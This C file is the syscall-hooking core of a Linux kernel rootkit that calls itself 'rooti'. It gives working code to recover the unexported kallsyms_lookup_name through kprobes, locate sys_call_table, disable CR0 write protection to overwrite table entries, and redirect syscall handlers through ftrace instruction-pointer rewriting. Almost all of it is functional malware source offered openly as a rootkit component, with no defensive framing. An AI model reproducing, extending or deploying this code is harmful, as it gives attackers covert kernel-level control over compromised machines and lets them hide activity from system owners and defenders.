#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/version.h>

/*
    Different methods of syscall hooking supported by this rootkit. The macro ROOTI_HOOKING_METHOD defined below
    is meant to be set euqal one the these options, and it indicates the chosen hooking method.
*/
#define ROOTI_METHOD_TABLE_HIJACKING 0  // Classic method of overriding the pointer in the syscall table, works on older kernels
#define ROOTI_METHOD_FTRACE 1           // Intercepting syscalls by registering an ftrace callback to handlers and modifying IP reg

#define ROOTI_HOOKING_METHOD ROOTI_METHOD_FTRACE

/* Public functions prototypes */
int rooti_hooking_init(void);
int rooti_install_hook(struct rooti_syscall_hook *hook);
int rooti_install_hooks(struct rooti_syscall_hook *hooks, size_t count);
void rooti_uninstall_hook(struct rooti_syscall_hook *hook);
void rooti_uninstall_hooks(struct rooti_syscall_hook *hooks, size_t count);

unsigned long (*__kallsyms_lookup_name)(const char *name) = NULL;

/*
    Represents a syscall hook, extra members are defined for different types of hooking methods but
    the first three members are always defined and used for specifying the desired syscall, providing the hook function
    and for accessing the original syscall handler for use in the hook.
*/ 
struct rooti_syscall_hook {
    const char *name;      // hooked syscall name
    void *func;            // pointer to hook function
    void *orig;            // pointer to the original function
    unsigned long addr;    // memory address of the original function

#if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING
    unsigned int idx;      // index of the syscall in the kernel syscall table
#elif ROOTI_HOOKING_METHOD == ROOTI_METHOD_FTRACE
    struct ftrace_ops ops; // ftrace configuration
#endif
};

/* On 64 bit systems, the syscall handler symbols are prefixed with '__x64_'. */
#ifdef CONFIG_X86_64
#define ROOTI_SYSCALL_NAME(name) ("__x64_" name)
#else
#define ROOTI_SYSCALL_NAME(name) (name)
#endif

/* Shorthand for initializing syscall hook objects */
#define ROOTI_HOOK(_name, _hook, _orig) \
{ \
    .name = ROOTI_SYSCALL_NAME(_name), \
    .func = (_hook), \
    .orig = (_orig)  \
}

/* 
    Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported.
    We can work around this by probing the kallsyms_lookup_name() function with kernel probes.
    One of the things that probing a function gives us is its address in kernel memory.
*/
static unsigned long rooti_resolve_kln_addr(void)
{
    struct kprobe kp;
    unsigned long addr;

    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = "kallsyms_lookup_name";

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        return 0;
    }

    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/*
    Locates the memory address of the symbol of the requested function to hook.
*/
static unsigned long rooti_resolve_syscall_handler_addr(struct rooti_syscall_hook *hook)
{
    // Resolve the address of the requested symbol
    hook->addr = __kallsyms_lookup_name(hook->name);
    if (hook->addr == 0) {
        printk(KERN_DEBUG "rooti: unresolved symbol: %s\n", hook->name);
        return -EINVAL;
    }
    return 0;
}

/* ===================== SPECIFIC CODE FOR TABLE HIJACKING METHOD ===================== */
#if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING

unsigned long *__sys_call_table = NULL;

/*
    Custom utility function for writing intp the CR0 register. It is needed as the original function
    from the linux headers prevents us from modifying the 16th bit of the register (in order to disable write protection).
*/
static inline void rooti_force_write_cr0(unsigned long val)
{
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

/* Disable the write protcetion by clearing the 16th bit of the CR0 register */
static inline void rooti_unprotect_memory(void)
{
    rooti_force_write_cr0(read_cr0() & (~0x10000));
}

/* Enable the write protection by setting the 16th bit of the CR0 register */
static inline void rooti_protect_memory(void)
{
    rooti_force_write_cr0(read_cr0() | (0x10000));
}

/*
    Looks up the address of the kernel syscall table.
    Returns a pointer to the table if found, otherwise returns NULL.
*/
static unsigned long *rooti_locate_syscall_table(void)
{
    unsigned long *syscall_table = NULL;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
    syscall_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
#endif

    return syscall_table;
}

/*
    Searches for the entry in the kernel syscall table pointing to the syscall handler function
    in the given address. If found, returns the index in the table, otherwise, returns a negative error code.
*/
static int rooti_resolve_syscall_entry_index(struct rooti_syscall_hook *hook)
{
    for (unsigned int i = 0; i < 500; i++) {
        if (__sys_call_table[i] == hook->addr) {
            hook->idx = i;
            return 0;
        }
    }
    return -EINVAL;
}

/*
    Saves a reference to the original syscall handler function.
*/
static void rooti_store_original(struct rooti_syscall_hook *hook)
{
    *((unsigned long *)hook->orig) = hook->addr;
}

/*
    Hooks a syscall by overriding its entry in the kernel syscall table to point
    to the given hook function instead.
*/
static int rooti_install_table_hijack_hook(struct rooti_syscall_hook *hook)
{
    // Find the index of the syscall in the syscall table
    int ret = rooti_resolve_syscall_handler_addr(hook);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: register_ftrace_function() failed: %d\n", ret);
        return ret;
    }
    
    // Store a pointer to the original handler
    rooti_store_original(hook);

    // Find the index of the syscall in the syscall table
    ret = rooti_resolve_syscall_entry_index(hook);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_find_syscall_entry_index() failed: %d\n", ret);
        return ret;
    }

    // Disable write protection
    rooti_unprotect_memory();

    // Override the syscall table entry
    __sys_call_table[hook->idx] = (unsigned long)hook->func;

    // Re-enable write protection
    rooti_protect_memory();

    return 0;
}

static void rooti_uninstall_table_hijack_hook(struct rooti_syscall_hook *hook)
{   
    // Disable write protection
    rooti_unprotect_memory();

    // Restore the syscall table entry
    __sys_call_table[hook->idx] = hook->addr;

    // Re-enable write protection
    rooti_protect_memory();
}


/* ===================== SPECIFIC CODE FOR FTRACE METHOD ===================== */
#elif ROOTI_HOOKING_METHOD == ROOTI_METHOD_FTRACE

/* Recursion loops protection mechanism - often times hook functions from this module
 * will call the original syscall handler. The call to the original kernel function would trigger
 * ftrace callback, which would in turn point to the hook function, which would call the original handler
 * and so on and so forth. We've got two ways to handle this:
 * 1. Skip the call to ftrace by setting the original syscall handler pointer (e.g rooti_syscall_hook.orig) to the memory
 *    address of the instruction after the instruction to call ftrace. Used by setting ROOTI_USE_FENTRY_OFFSET
 * 2. Check the return address of the traced function to ensure that the callback will point to the hook function
 *    only if the original syscall handler was NOT called by the hook function itself.
 *    Used by clearing ROOTI_USE_FENTRY_OFFSET
 */
#define ROOTI_USE_FENTRY_OFFSET 0
#if !ROOTI_USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/*
    Saves a reference to the original syscall handler function. If the recursion protection mechanism in use
    dictates that the call to ftrace callback should be skipped, then the offset is added to the memory address of the function,
    skipping the instruction for calling ftrace.
*/
static void rooti_store_original(struct rooti_syscall_hook *hook)
{
#if ROOTI_USE_FENTRY_OFFSET
    // Skip over the ftrace call when called from this module - recursion protection mechanism
    *((unsigned long *)hook->orig) = hook->addr + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->orig) = hook->addr;
#endif
}

/*
    Callback function for registered traced function. This callback will set the IP register (in the context of the traced function)
    to the memory address of our function, effectively hooking the call.
*/
static void notrace rooti_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    // Obtain a pointer to the container rooti_syscall_hook struct
    struct rooti_syscall_hook *hook = container_of(ops, struct rooti_syscall_hook, ops);

#if ROOTI_USE_FENTRY_OFFSET
    regs->regs.ip = (unsigned long)hook->func;
#else
    // Only point to the hook function if called from outside and not from the hook function, which is local to
    // this module - recursion protection mechanism
    if(!within_module(parent_ip, THIS_MODULE)) {
        regs->regs.ip = (unsigned long)hook->func;
    }
#endif
}

static int rooti_install_ftrace_hook(struct rooti_syscall_hook *hook)
{
    // Resolve the address of the symbol in kernel memory
    int ret = rooti_resolve_syscall_handler_addr(hook);
    if (ret < 0) {
        return ret;
    }

    // Save a pointer the original handler
    rooti_store_original(hook);

    // Register the callback function
    hook->ops.func = rooti_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    // Set IP filter for the memory address of the original syscall handler
    ret = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: ftrace_set_filter_ip() failed: %d\n", ret);
        return ret;
    }
    // Register the function
    ret = register_ftrace_function(&hook->ops);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: register_ftrace_function() failed: %d\n", ret);
        return ret;
    }

    return 0;
}

/*
    Uninstalls a registered hook by unregistering the ftrace callback function
    and removing the IP ftrace filter at the memory address of the original syscall handler.
*/
static void rooti_uninstall_ftrace_hook(struct rooti_syscall_hook *hook)
{
    int ret;

    // Unregister hook function
    ret = unregister_ftrace_function(&hook->ops);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: unregister_ftrace_function() failed: %d\n", ret);
    }
    // Remove ftrace filter
    ret = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: ftrace_set_filter_ip() failed: %d\n", ret);
    }
}

#else
#error "Invalid hooking method specified"
#endif


/*
    Installs a new syscall hook by invoking the right function to do so, following
    the selected hooking method.
*/
int rooti_install_hook(struct rooti_syscall_hook *hook)
{
#if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING
    return rooti_install_table_hijack_hook(hook);
#elif ROOTI_HOOKING_METHOD == ROOTI_METHOD_FTRACE
    return rooti_install_ftrace_hook(hook);
#endif
}

/*
    Unistalls a new syscall hook by invoking the right function to do so, following
    the selected hooking method.
*/
void rooti_uninstall_hook(struct rooti_syscall_hook *hook)
{
#if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING
    return rooti_uninstall_table_hijack_hook(hook);
#elif ROOTI_HOOKING_METHOD == ROOTI_METHOD_FTRACE
    return rooti_uninstall_ftrace_hook(hook);
#endif
}

/*
    Installs all the hooks in the given hooks array.
*/
int rooti_install_hooks(struct rooti_syscall_hook *hooks, size_t count)
{
    int ret;
    int i = 0;

    for (i = 0; i < count; i++) {
        ret = rooti_install_hook(&hooks[i]);
        if (ret < 0) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_hook(&hooks[--i]);
    }
    return ret;
}

/*
    Uninstalls all registered hooks in the given hooks array.
*/
void rooti_uninstall_hooks(struct rooti_syscall_hook *hooks, size_t count)
{
    for (int i = 0; i < count; i++) {
        rooti_uninstall_hook(&hooks[i]);
    }
}

/*
    Some initialization of local data structures that make the function hooking possible.
    This function is to be called once at the beginning of the program, before installing any hooks.
*/
int rooti_hooking_init(void)
{
    // Resolve the address of kallsyms_lookup_name()
    __kallsyms_lookup_name = (unsigned long (*)(const char *name))rooti_resolve_kln_addr();
    if (__kallsyms_lookup_name == NULL) {
        printk(KERN_DEBUG "rooti: rooti_resolve_kln_addr() failed: the symbol could not be found\n");
        return -EINVAL;
    }

#if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING
    __sys_call_table = rooti_locate_syscall_table();
    if (__sys_call_table == NULL) {
        printk(KERN_DEBUG "rooti: rooti_locate_syscall_table() failed: the symbol could not be found\n");
        return -EINVAL;
    }
#endif

    return 0;
}